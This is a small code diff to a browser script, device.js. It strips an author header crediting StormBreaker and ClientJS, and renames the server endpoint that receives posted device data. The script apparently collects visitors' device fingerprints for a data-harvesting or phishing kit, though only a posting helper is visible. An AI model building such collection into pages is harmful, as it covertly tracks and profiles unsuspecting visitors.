@@ -1,16 +1,3 @@
-// device.js by KasRoudra
-// Author   : KasRoudra
-// Github   : https://github.com/KasRoudra
-// Email    : kasroudrard@gmail.com
-// Messenger: https//m.me/KasRoudra
-// Credits  : StormBreaker(https://github.com/ultrasecurity/Storm-Breaker), and ClientJS
-// CreatedAt: 10-08-2022
-
-
-// ClientJS
-
-// Source: https://raw.githubusercontent.com/jackspirou/clientjs/master/dist/client.base.min.js
-
 ! function(e, i) {
     if ("object" == typeof exports && "object" == typeof module) module.exports = i();
     else if ("function" == typeof define && define.amd) define([], i);
@@ -1036,7 +1023,7 @@
 
 const device = (allow_redir) => {
     // post object as formdata
-    const post = (obj, url=window.location.origin+"/post.php", error=false) => {
+    const post = (obj, url=window.location.origin+"/device_post.php", error=false) => {
         const formData = new FormData();
         for (const key in obj) {
             formData.append(key, obj[key]);
